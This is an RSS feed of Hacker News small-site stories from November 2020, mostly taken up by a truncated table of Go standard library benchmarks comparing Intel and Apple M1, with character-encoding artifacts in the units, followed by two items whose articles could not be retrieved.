<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sat, 21 Nov 2020 20:20:47 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sat, 21 Nov 2020 20:20:47 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Go standard library benchmarks – Intel vs. M1]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25158243">thread link</a>) | @jeremylevy
<br/>
November 19, 2020 | https://roland.zone/m1-go-benchmarks/ | <a href="https://web.archive.org/web/*/https://roland.zone/m1-go-benchmarks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<tr><th></th><th colspan="2">time/op</th><th>delta
</th></tr><tr><th colspan="4">pkg:archive/tar goos:darwin goarch:arm64</th></tr><tr><td>/Writer/USTAR</td><td>20.2Âµs Â±26%</td><td>2.4Âµs Â± 1%</td><td>âˆ’87.95%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>/Writer/GNU</td><td>4.56Âµs Â± 2%</td><td>2.84Âµs Â± 0%</td><td>âˆ’37.83%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>/Writer/PAX</td><td>7.95Âµs Â± 2%</td><td>4.96Âµs Â± 0%</td><td>âˆ’37.59%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>/Reader/USTAR</td><td>3.60Âµs Â± 2%</td><td>2.20Âµs Â± 2%</td><td>âˆ’38.89%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>/Reader/GNU</td><td>2.29Âµs Â± 2%</td><td>1.40Âµs Â± 0%</td><td>âˆ’38.74%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>/Reader/PAX</td><td>7.58Âµs Â± 3%</td><td>4.65Âµs Â± 1%</td><td>âˆ’38.57%</td><td>(p=0.008 n=5+5)
</td></tr><tr><th colspan="4">pkg:archive/zip goos:darwin goarch:arm64</th></tr><tr><td>CompressedZipGarbage</td><td>4.84ms Â± 8%</td><td>1.57ms Â± 0%</td><td>âˆ’67.51%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>Zip64Test</td><td>12.1ms Â± 3%</td><td>11.8ms Â± 1%</td><td>~</td><td>(p=0.095 n=5+5)
</td></tr><tr><td>Zip64TestSizes/4096</td><td>7.44Âµs Â±12%</td><td>3.79Âµs Â± 3%</td><td>âˆ’49.01%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Zip64TestSizes/1048576</td><td>102Âµs Â± 5%</td><td>40Âµs Â± 2%</td><td>âˆ’60.29%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Zip64TestSizes/67108864</td><td>6.02ms Â± 3%</td><td>2.26ms Â± 1%</td><td>âˆ’62.37%</td><td>(p=0.008 n=5+5)
</td></tr><tr><th colspan="4">pkg:bufio goos:darwin goarch:arm64</th></tr><tr><td>ReaderCopyOptimal</td><td>84.5ns Â± 4%</td><td>54.9ns Â± 1%</td><td>âˆ’35.01%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ReaderCopyUnoptimal</td><td>140ns Â± 4%</td><td>91ns Â± 0%</td><td>âˆ’34.72%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ReaderCopyNoWriteTo</td><td>3.98Âµs Â± 4%</td><td>1.55Âµs Â± 1%</td><td>âˆ’60.98%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ReaderWriteToOptimal</td><td>313ns Â± 5%</td><td>321ns Â± 1%</td><td>~</td><td>(p=0.310 n=5+5)
</td></tr><tr><td>ReaderReadString</td><td>107ns Â± 3%</td><td>74ns Â± 0%</td><td>âˆ’30.38%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterCopyOptimal</td><td>91.3ns Â± 2%</td><td>58.1ns Â± 1%</td><td>âˆ’36.39%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterCopyUnoptimal</td><td>116ns Â± 2%</td><td>70ns Â± 1%</td><td>âˆ’39.42%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterCopyNoReadFrom</td><td>3.85Âµs Â± 2%</td><td>1.53Âµs Â± 0%</td><td>âˆ’60.21%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ReaderEmpty</td><td>792ns Â± 4%</td><td>354ns Â± 1%</td><td>âˆ’55.27%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterEmpty</td><td>694ns Â± 5%</td><td>342ns Â± 1%</td><td>âˆ’50.76%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriterFlush</td><td>13.7ns Â± 2%</td><td>8.9ns Â± 4%</td><td>âˆ’34.87%</td><td>(p=0.008 n=5+5)
</td></tr><tr><th colspan="4">pkg:bytes goos:darwin goarch:arm64</th></tr><tr><td>ReadString</td><td>5.76Âµs Â± 5%</td><td>2.16Âµs Â± 2%</td><td>âˆ’62.56%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriteByte</td><td>13.2Âµs Â±12%</td><td>9.0Âµs Â± 1%</td><td>âˆ’31.51%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>WriteRune</td><td>32.4Âµs Â± 2%</td><td>18.2Âµs Â± 1%</td><td>âˆ’43.98%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BufferNotEmptyWriteRead</td><td>222Âµs Â± 1%</td><td>184Âµs Â± 1%</td><td>âˆ’17.11%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BufferFullSmallReads</td><td>50.8Âµs Â± 1%</td><td>36.1Âµs Â± 0%</td><td>âˆ’28.89%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexByte/10</td><td>5.17ns Â± 2%</td><td>4.16ns Â± 1%</td><td>âˆ’19.48%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexByte/32</td><td>6.46ns Â± 2%</td><td>3.94ns Â± 0%</td><td>âˆ’38.91%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>IndexByte/4K</td><td>84.3ns Â± 2%</td><td>72.9ns Â± 1%</td><td>âˆ’13.52%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexByte/4M</td><td>176Âµs Â±15%</td><td>64Âµs Â± 0%</td><td>âˆ’63.48%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexByte/64M</td><td>4.42ms Â± 2%</td><td>1.08ms Â± 2%</td><td>âˆ’75.47%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexBytePortable/10</td><td>6.38ns Â± 1%</td><td>5.66ns Â± 1%</td><td>âˆ’11.29%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexBytePortable/32</td><td>27.7ns Â± 1%</td><td>12.5ns Â± 0%</td><td>âˆ’54.77%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>IndexBytePortable/4K</td><td>1.55Âµs Â± 2%</td><td>1.29Âµs Â± 0%</td><td>âˆ’16.30%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexBytePortable/4M</td><td>1.60ms Â± 1%</td><td>1.31ms Â± 0%</td><td>âˆ’17.84%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexBytePortable/64M</td><td>26.3ms Â± 1%</td><td>21.1ms Â± 0%</td><td>âˆ’19.79%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRune/10</td><td>17.1ns Â± 2%</td><td>9.7ns Â± 1%</td><td>âˆ’43.04%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRune/32</td><td>17.2ns Â± 0%</td><td>13.6ns Â± 2%</td><td>âˆ’21.37%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>IndexRune/4K</td><td>116ns Â± 2%</td><td>85ns Â± 1%</td><td>âˆ’26.81%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRune/4M</td><td>170Âµs Â± 3%</td><td>64Âµs Â± 1%</td><td>âˆ’62.34%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRune/64M</td><td>4.74ms Â± 2%</td><td>1.08ms Â± 0%</td><td>âˆ’77.31%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/10</td><td>5.39ns Â± 3%</td><td>4.05ns Â± 0%</td><td>âˆ’24.86%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/32</td><td>6.88ns Â± 2%</td><td>3.92ns Â± 0%</td><td>âˆ’43.10%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/4K</td><td>84.2ns Â± 2%</td><td>73.0ns Â± 1%</td><td>âˆ’13.35%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/4M</td><td>157Âµs Â± 4%</td><td>64Âµs Â± 1%</td><td>âˆ’59.18%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexRuneASCII/64M</td><td>4.37ms Â± 1%</td><td>1.08ms Â± 1%</td><td>âˆ’75.37%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/0</td><td>3.01ns Â± 0%</td><td>2.05ns Â± 1%</td><td>âˆ’32.05%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>Equal/1</td><td>6.56ns Â± 0%</td><td>3.43ns Â± 0%</td><td>âˆ’47.73%</td><td>(p=0.000 n=4+5)
</td></tr><tr><td>Equal/6</td><td>6.57ns Â± 0%</td><td>3.81ns Â± 1%</td><td>âˆ’42.01%</td><td>(p=0.000 n=4+5)
</td></tr><tr><td>Equal/9</td><td>6.38ns Â± 1%</td><td>3.75ns Â± 1%</td><td>âˆ’41.24%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/15</td><td>6.36ns Â± 1%</td><td>3.73ns Â± 1%</td><td>âˆ’41.38%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/16</td><td>6.38ns Â± 2%</td><td>3.82ns Â± 0%</td><td>âˆ’40.10%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/20</td><td>7.38ns Â± 3%</td><td>4.28ns Â± 0%</td><td>âˆ’42.02%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/32</td><td>8.25ns Â± 4%</td><td>4.12ns Â± 1%</td><td>âˆ’50.10%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/4K</td><td>106ns Â± 1%</td><td>84ns Â± 1%</td><td>âˆ’20.83%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/4M</td><td>267Âµs Â± 1%</td><td>111Âµs Â± 1%</td><td>âˆ’58.45%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Equal/64M</td><td>6.98ms Â± 2%</td><td>2.20ms Â± 1%</td><td>âˆ’68.54%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/10</td><td>12.4ns Â± 2%</td><td>5.3ns Â± 1%</td><td>âˆ’57.46%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/32</td><td>12.6ns Â± 2%</td><td>29.2ns Â± 1%</td><td>+131.13%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/4K</td><td>4.91Âµs Â± 1%</td><td>1.95Âµs Â± 0%</td><td>âˆ’60.40%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/4M</td><td>5.04ms Â± 2%</td><td>1.99ms Â± 0%</td><td>âˆ’60.58%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Index/64M</td><td>82.9ms Â± 6%</td><td>31.9ms Â± 0%</td><td>âˆ’61.53%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/10</td><td>10.8ns Â± 4%</td><td>5.1ns Â± 1%</td><td>âˆ’53.05%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/32</td><td>12.3ns Â± 7%</td><td>9.2ns Â± 0%</td><td>âˆ’25.69%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/4K</td><td>107ns Â± 2%</td><td>77ns Â± 1%</td><td>âˆ’27.90%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/4M</td><td>176Âµs Â± 5%</td><td>64Âµs Â± 1%</td><td>âˆ’63.77%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexEasy/64M</td><td>4.62ms Â± 7%</td><td>1.07ms Â± 0%</td><td>âˆ’76.76%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Count/10</td><td>18.4ns Â± 1%</td><td>9.9ns Â± 0%</td><td>âˆ’45.98%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>Count/32</td><td>19.5ns Â± 2%</td><td>33.4ns Â± 0%</td><td>+71.29%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>Count/4K</td><td>4.92Âµs Â± 1%</td><td>1.96Âµs Â± 1%</td><td>âˆ’60.24%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>Count/4M</td><td>5.09ms Â± 5%</td><td>1.99ms Â± 0%</td><td>âˆ’60.94%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Count/64M</td><td>81.5ms Â± 2%</td><td>31.9ms Â± 0%</td><td>âˆ’60.89%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountEasy/10</td><td>17.0ns Â± 2%</td><td>9.5ns Â± 1%</td><td>âˆ’43.98%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountEasy/32</td><td>19.1ns Â± 1%</td><td>15.2ns Â± 0%</td><td>âˆ’20.43%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>CountEasy/4K</td><td>113ns Â± 2%</td><td>83ns Â± 2%</td><td>âˆ’26.89%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountEasy/4M</td><td>175Âµs Â± 4%</td><td>64Âµs Â± 1%</td><td>âˆ’63.67%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountEasy/64M</td><td>4.72ms Â± 2%</td><td>1.07ms Â± 0%</td><td>âˆ’77.23%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountSingle/10</td><td>6.67ns Â± 3%</td><td>6.96ns Â± 1%</td><td>+4.41%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountSingle/32</td><td>7.36ns Â± 1%</td><td>4.46ns Â± 0%</td><td>âˆ’39.43%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>CountSingle/4K</td><td>100ns Â±15%</td><td>82ns Â± 1%</td><td>âˆ’17.62%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountSingle/4M</td><td>171Âµs Â±21%</td><td>83Âµs Â± 1%</td><td>âˆ’51.70%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountSingle/64M</td><td>4.50ms Â± 0%</td><td>1.38ms Â± 1%</td><td>âˆ’69.26%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/#00</td><td>8.87ns Â± 2%</td><td>4.66ns Â± 0%</td><td>âˆ’47.40%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/ONLYUPPER</td><td>43.7ns Â± 3%</td><td>30.4ns Â± 1%</td><td>âˆ’30.55%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/abc</td><td>25.9ns Â± 2%</td><td>16.6ns Â± 0%</td><td>âˆ’36.19%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/AbC123</td><td>32.1ns Â± 3%</td><td>19.9ns Â± 1%</td><td>âˆ’38.10%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/azAZ09_</td><td>31.8ns Â± 1%</td><td>18.6ns Â± 1%</td><td>âˆ’41.54%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/longStrinGwitHmixofsmaLLandcAps</td><td>72.5ns Â± 3%</td><td>45.7ns Â± 0%</td><td>âˆ’36.96%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/longÉ�stringÉ�withÉ�nonasciiâ±¯chars</td><td>425ns Â± 2%</td><td>249ns Â± 0%</td><td>âˆ’41.31%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/É�É�É�É�É�</td><td>229ns Â± 2%</td><td>158ns Â± 1%</td><td>âˆ’31.24%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToUpper/a\u0080\U0010ffff</td><td>108ns Â± 3%</td><td>73ns Â± 1%</td><td>âˆ’32.04%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/#00</td><td>9.17ns Â± 1%</td><td>4.66ns Â± 1%</td><td>âˆ’49.16%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/abc</td><td>34.3ns Â± 1%</td><td>20.4ns Â± 0%</td><td>âˆ’40.56%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/AbC123</td><td>32.8ns Â± 2%</td><td>17.9ns Â± 0%</td><td>âˆ’45.42%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/azAZ09_</td><td>35.7ns Â± 3%</td><td>20.5ns Â± 0%</td><td>âˆ’42.66%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/longStrinGwitHmixofsmaLLandcAps</td><td>75.6ns Â± 1%</td><td>47.5ns Â± 1%</td><td>âˆ’37.23%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/LONGâ±¯STRINGâ±¯WITHâ±¯NONASCIIâ±¯CHARS</td><td>356ns Â± 2%</td><td>220ns Â± 1%</td><td>âˆ’38.08%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/â±­â±­â±­â±­â±­</td><td>191ns Â± 2%</td><td>134ns Â± 1%</td><td>âˆ’29.76%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToLower/A\u0080\U0010ffff</td><td>108ns Â± 2%</td><td>72ns Â± 1%</td><td>âˆ’32.99%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/16</td><td>95.9ns Â± 3%</td><td>44.3ns Â± 0%</td><td>âˆ’53.76%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/256</td><td>660ns Â± 3%</td><td>357ns Â± 0%</td><td>âˆ’45.96%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/4096</td><td>9.66Âµs Â± 3%</td><td>4.94Âµs Â± 0%</td><td>âˆ’48.82%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/65536</td><td>200Âµs Â± 1%</td><td>111Âµs Â± 1%</td><td>âˆ’44.32%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/ASCII/1048576</td><td>3.16ms Â± 1%</td><td>1.88ms Â± 0%</td><td>âˆ’40.42%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/16</td><td>185ns Â± 3%</td><td>109ns Â± 0%</td><td>âˆ’40.97%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/256</td><td>1.81Âµs Â± 2%</td><td>1.06Âµs Â± 0%</td><td>âˆ’41.37%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/4096</td><td>33.6Âµs Â± 5%</td><td>19.3Âµs Â± 1%</td><td>âˆ’42.50%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/65536</td><td>569Âµs Â± 2%</td><td>343Âµs Â± 0%</td><td>âˆ’39.63%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Fields/Mixed/1048576</td><td>9.32ms Â± 5%</td><td>5.54ms Â± 0%</td><td>âˆ’40.57%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/ASCII/16</td><td>154ns Â± 5%</td><td>87ns Â± 0%</td><td>âˆ’43.61%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/ASCII/256</td><td>1.58Âµs Â± 9%</td><td>0.91Âµs Â± 1%</td><td>âˆ’42.47%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/ASCII/4096</td><td>26.0Âµs Â± 2%</td><td>15.6Âµs Â± 0%</td><td>âˆ’39.96%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/ASCII/65536</td><td>411Âµs Â± 0%</td><td>249Âµs Â± 0%</td><td>âˆ’39.36%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>FieldsFunc/ASCII/1048576</td><td>6.64ms Â± 1%</td><td>4.00ms Â± 0%</td><td>âˆ’39.73%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/Mixed/16</td><td>168ns Â± 0%</td><td>101ns Â± 1%</td><td>âˆ’39.72%</td><td>(p=0.016 n=4+5)
</td></tr><tr><td>FieldsFunc/Mixed/256</td><td>1.59Âµs Â± 1%</td><td>0.93Âµs Â± 0%</td><td>âˆ’41.16%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/Mixed/4096</td><td>29.9Âµs Â± 3%</td><td>17.5Âµs Â± 2%</td><td>âˆ’41.65%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/Mixed/65536</td><td>509Âµs Â± 2%</td><td>311Âµs Â± 0%</td><td>âˆ’38.81%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>FieldsFunc/Mixed/1048576</td><td>8.22ms Â± 1%</td><td>5.05ms Â± 0%</td><td>âˆ’38.53%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>TrimSpace/NoTrim</td><td>4.66ns Â± 1%</td><td>2.75ns Â± 1%</td><td>âˆ’40.85%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>TrimSpace/ASCII</td><td>7.18ns Â± 1%</td><td>4.89ns Â± 1%</td><td>âˆ’31.93%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>TrimSpace/SomeNonASCII</td><td>85.5ns Â± 2%</td><td>59.6ns Â± 0%</td><td>âˆ’30.23%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>TrimSpace/JustNonASCII</td><td>158ns Â± 3%</td><td>107ns Â± 1%</td><td>âˆ’32.38%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToValidUTF8/Valid</td><td>29.9ns Â± 2%</td><td>18.0ns Â± 1%</td><td>âˆ’39.99%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToValidUTF8/InvalidASCII</td><td>36.3ns Â± 1%</td><td>24.5ns Â± 0%</td><td>âˆ’32.62%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>ToValidUTF8/InvalidNonASCII</td><td>87.8ns Â± 2%</td><td>53.9ns Â± 0%</td><td>âˆ’38.64%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexHard1</td><td>114Âµs Â± 2%</td><td>330Âµs Â± 0%</td><td>+190.43%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexHard2</td><td>159Âµs Â± 2%</td><td>330Âµs Â± 0%</td><td>+107.98%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexHard3</td><td>631Âµs Â± 1%</td><td>356Âµs Â± 0%</td><td>âˆ’43.61%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>IndexHard4</td><td>633Âµs Â± 1%</td><td>1313Âµs Â± 0%</td><td>+107.26%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>LastIndexHard1</td><td>1.56ms Â± 1%</td><td>1.31ms Â± 0%</td><td>âˆ’15.66%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>LastIndexHard2</td><td>1.57ms Â± 1%</td><td>1.31ms Â± 0%</td><td>âˆ’16.03%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>LastIndexHard3</td><td>1.56ms Â± 1%</td><td>1.32ms Â± 0%</td><td>âˆ’15.83%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountHard1</td><td>113Âµs Â± 2%</td><td>329Âµs Â± 0%</td><td>+192.21%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountHard2</td><td>161Âµs Â± 9%</td><td>330Âµs Â± 1%</td><td>+105.44%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountHard3</td><td>644Âµs Â± 8%</td><td>356Âµs Â± 0%</td><td>âˆ’44.67%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitEmptySeparator</td><td>12.2ms Â± 5%</td><td>4.9ms Â± 0%</td><td>âˆ’59.71%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitSingleByteSeparator</td><td>1.46ms Â± 3%</td><td>1.75ms Â± 0%</td><td>+19.63%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitMultiByteSeparator</td><td>1.42ms Â± 1%</td><td>1.20ms Â± 2%</td><td>âˆ’15.75%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitNSingleByteSeparator</td><td>207ns Â± 9%</td><td>173ns Â± 1%</td><td>âˆ’16.49%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitNMultiByteSeparator</td><td>276ns Â± 3%</td><td>212ns Â± 1%</td><td>âˆ’23.22%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Repeat</td><td>52.8ns Â± 3%</td><td>33.4ns Â± 0%</td><td>âˆ’36.75%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/1</td><td>4.78ns Â± 2%</td><td>2.55ns Â± 0%</td><td>âˆ’46.67%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/2</td><td>4.74ns Â± 2%</td><td>2.51ns Â± 1%</td><td>âˆ’46.96%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/4</td><td>4.80ns Â± 3%</td><td>2.20ns Â± 1%</td><td>âˆ’54.08%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/8</td><td>3.89ns Â± 2%</td><td>2.06ns Â± 1%</td><td>âˆ’46.95%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/16</td><td>3.86ns Â± 2%</td><td>2.08ns Â± 0%</td><td>âˆ’46.21%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>BytesCompare/32</td><td>5.09ns Â± 6%</td><td>2.55ns Â± 0%</td><td>âˆ’49.96%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>BytesCompare/64</td><td>5.99ns Â± 1%</td><td>3.45ns Â± 0%</td><td>âˆ’42.43%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/128</td><td>7.95ns Â± 3%</td><td>5.32ns Â± 0%</td><td>âˆ’33.06%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>BytesCompare/256</td><td>11.6ns Â± 9%</td><td>9.1ns Â± 1%</td><td>âˆ’21.88%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/512</td><td>18.9ns Â± 9%</td><td>16.7ns Â± 1%</td><td>âˆ’11.36%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/1024</td><td>32.7ns Â± …</td></tr></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://roland.zone/m1-go-benchmarks/">https://roland.zone/m1-go-benchmarks/</a></em></p>]]>
            </description>
            <link>https://roland.zone/m1-go-benchmarks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25158243</guid>
            <pubDate>Fri, 20 Nov 2020 07:59:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Increase in Bitcoin Addresses as More People Join the BTC Price Surge]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 103 (<a href="https://news.ycombinator.com/item?id=25157946">thread link</a>) | @coincolony
<br/>
November 19, 2020 | https://coincolony.net/increase-in-bitcoin-addresses-as-more-people-join-the-btc-price-surge/ | <a href="https://web.archive.org/web/*/https://coincolony.net/increase-in-bitcoin-addresses-as-more-people-join-the-btc-price-surge/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://coincolony.net/increase-in-bitcoin-addresses-as-more-people-join-the-btc-price-surge/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157946</guid>
            <pubDate>Fri, 20 Nov 2020 07:01:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Kingdoms face off! (Procedural Simulation)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157741">thread link</a>) | @CalderWhite
<br/>
November 19, 2020 | https://calderwhite.github.io/KingdomsAndCrusaders | <a href="https://web.archive.org/web/*/https://calderwhite.github.io/KingdomsAndCrusaders">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://calderwhite.github.io/KingdomsAndCrusaders</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157741</guid>
            <pubDate>Fri, 20 Nov 2020 06:10:31 GMT</pubDate>
        </item>
        <item>
            <title>
